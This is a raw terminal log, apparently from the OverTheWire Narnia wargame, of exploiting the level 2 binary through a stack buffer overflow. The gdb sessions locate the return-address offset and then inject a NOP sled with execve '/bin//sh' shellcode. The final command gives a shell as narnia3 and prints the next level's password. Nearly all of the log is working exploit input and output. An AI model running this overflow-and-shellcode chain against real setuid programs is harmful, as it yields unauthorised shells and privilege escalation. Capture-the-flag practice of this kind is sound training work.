narnia2@melinda:~$ cd /narnia
narnia2@melinda:/narnia$ gdb narnia2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
(gdb) run `python 'a' * 140 + 'bbbb'`
Starting program: /games/narnia/narnia2 `python 'a' * 140 + 'bbbb'`
python: can't open file 'a': [Errno 2] No such file or directory
Usage: /games/narnia/narnia2 argument
[Inferior 1 (process 19475) exited with code 01]
(gdb) run `python -c "print 'a' * 140 + 'bbbb'"`
Starting program: /games/narnia/narnia2 `python -c "print 'a' * 140 + 'bbbb'"`

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/40x $esp
0xffffd630:	0x00000000	0xffffd6c4	0xffffd6d0	0xf7fcf000
0xffffd640:	0x00000000	0xffffd61c	0xffffd6d0	0x00000000
0xffffd650:	0x0804821c	0xf7fcaff4	0x00000000	0x00000000
0xffffd660:	0x00000000	0xe49ff93d	0xd33b7d2d	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000002	0x08048370
0xffffd680:	0x00000000	0xf7ff0a90	0xf7e403c9	0xf7ffcff4
0xffffd690:	0x00000002	0x08048370	0x00000000	0x08048391
0xffffd6a0:	0x08048424	0x00000002	0xffffd6c4	0x08048490
0xffffd6b0:	0x08048500	0xf7feb660	0xffffd6bc	0xf7ffd918
0xffffd6c0:	0x00000002	0xffffd7fc	0xffffd812	0x00000000
(gdb) x/40x $esp - 144
0xffffd5a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd600:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd610:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd620:	0x61616161	0x61616161	0x61616161	0x62626262
0xffffd630:	0x00000000	0xffffd6c4	0xffffd6d0	0xf7fcf000
(gdb) x/40x $esp - 145
0xffffd59f:	0x616161f7	0x61616161	0x61616161	0x61616161
0xffffd5af:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5bf:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5cf:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5df:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5ef:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5ff:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd60f:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd61f:	0x61616161	0x61616161	0x61616161	0x62626261
0xffffd62f:	0x00000062	0xffd6c400	0xffd6d0ff	0xfcf000ff

(gdb) run $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "bbbb"')
Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "bbbb"')

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/250x $esp
0xffffd630:	0x00000000	0xffffd6c4	0xffffd6d0	0xf7fcf000
0xffffd640:	0x00000000	0xffffd61c	0xffffd6d0	0x00000000
0xffffd650:	0x0804821c	0xf7fcaff4	0x00000000	0x00000000
0xffffd660:	0x00000000	0x12bfe25a	0x251b664a	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000002	0x08048370
0xffffd680:	0x00000000	0xf7ff0a90	0xf7e403c9	0xf7ffcff4
0xffffd690:	0x00000002	0x08048370	0x00000000	0x08048391
0xffffd6a0:	0x08048424	0x00000002	0xffffd6c4	0x08048490
0xffffd6b0:	0x08048500	0xf7feb660	0xffffd6bc	0xf7ffd918
0xffffd6c0:	0x00000002	0xffffd7fc	0xffffd812	0x00000000
0xffffd6d0:	0xffffd8a3	0xffffd8d4	0xffffd8e4	0xffffd8f8
0xffffd6e0:	0xffffd91c	0xffffd930	0xffffd939	0xffffd946
0xffffd6f0:	0xffffde67	0xffffde72	0xffffde7d	0xffffdeca
0xffffd700:	0xffffdee1	0xffffdef0	0xffffdefc	0xffffdf0f
0xffffd710:	0xffffdf20	0xffffdf29	0xffffdf3c	0xffffdf44
0xffffd720:	0xffffdf54	0xffffdf69	0xffffdfa0	0xffffdfc0
0xffffd730:	0x00000000	0x00000020	0xf7fdb9c0	0x00000021
0xffffd740:	0xf7fdb000	0x00000010	0x1f898b75	0x00000006
0xffffd750:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffd760:	0x08048034	0x00000004	0x00000020	0x00000005
0xffffd770:	0x00000008	0x00000007	0xf7fdc000	0x00000008
0xffffd780:	0x00000000	0x00000009	0x08048370	0x0000000b
0xffffd790:	0x000036b2	0x0000000c	0x000036b2	0x0000000d
0xffffd7a0:	0x000036b2	0x0000000e	0x000036b2	0x00000017
---Type <return> to continue, or q <return> to quit---
0xffffd7b0:	0x00000000	0x00000019	0xffffd7db	0x0000001f
0xffffd7c0:	0xffffdfe2	0x0000000f	0xffffd7eb	0x00000000
0xffffd7d0:	0x00000000	0x00000000	0xc4000000	0xc1cf5d5f
0xffffd7e0:	0x52d2f689	0xb48ca64c	0x6972ab46	0x00363836
0xffffd7f0:	0x00000000	0x00000000	0x00000000	0x6d61672f
0xffffd800:	0x6e2f7365	0x696e7261	0x616e2f61	0x61696e72
0xffffd810:	0x90900032	0x90909090	0x90909090	0x90909090
0xffffd820:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd830:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd840:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd850:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd860:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd870:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd880:	0x90909090	0x50c03190	0x732f2f68	0x622f6868
0xffffd890:	0xe3896e69	0xe1895350	0x0bb0c289	0x626280cd
0xffffd8a0:	0x57006262	0x41484345	0x4f544c4c	0x3d4e454b
0xffffd8b0:	0x41364234	0x41312d41	0x2d464433	0x36333136
0xffffd8c0:	0x30452d31	0x2d463933	0x42463945	0x44392d34
0xffffd8d0:	0x00443036	0x4c454853	0x622f3d4c	0x622f6e69
0xffffd8e0:	0x00687361	0x4d524554	0x6574783d	0x322d6d72
0xffffd8f0:	0x6f633635	0x00726f6c	0x5f485353	0x45494c43
0xffffd900:	0x313d544e	0x322e3832	0x322e3131	0x312e3533
0xffffd910:	0x36203634	0x36393633	0x00323220	0x5f485353
0xffffd920:	0x3d595454	0x7665642f	0x7374702f	0x0032312f
---Type <return> to continue, or q <return> to quit---
0xffffd930:	0x415f434c	0x433d4c4c	0x45535500	0x616e3d52
0xffffd940:	0x61696e72	0x534c0032	0x4c4f435f	0x3d53524f
0xffffd950:	0x303d7372	0x3d69643a	0x333b3130	0x6e6c3a34
0xffffd960:	0x3b31303d	0x6d3a3633	0x30303d68	0x3d69703a
0xffffd970:	0x333b3034	0x6f733a33	0x3b31303d	0x643a3533
0xffffd980:	0x31303d6f	0x3a35333b	0x343d6462	0x33333b30
0xffffd990:	0x3a31303b	0x343d6463	0x33333b30	0x3a31303b
0xffffd9a0:	0x343d726f	0x31333b30	0x3a31303b	0x333d7573
0xffffd9b0:	0x31343b37	0x3d67733a	0x343b3033	0x61633a33
0xffffd9c0:	0x3b30333d	0x743a3134	0x30333d77	0x3a32343b
0xffffd9d0:	0x333d776f	0x32343b34	0x3d74733a	0x343b3733
0xffffd9e0:	0x78653a34	0x3b31303d	0x2a3a3233	0x7261742e
0xffffd9f0:	0x3b31303d	0x2a3a3133	0x7a67742e	0x3b31303d
0xffffda00:	0x2a3a3133	0x6a72612e	0x3b31303d	0x2a3a3133
0xffffda10:	0x7a61742e	0x3b31303d
(gdb) r $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff"')
process 21582 is executing new program: /proc/21582/exe
/proc/21582/exe: Permission denied.
(gdb) q
A debugging session is active.

	Inferior 1 [process 21582] will be killed.

Quit anyway? (y or n) y
narnia2@melinda:/narnia$ /narnia/narnia2 $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee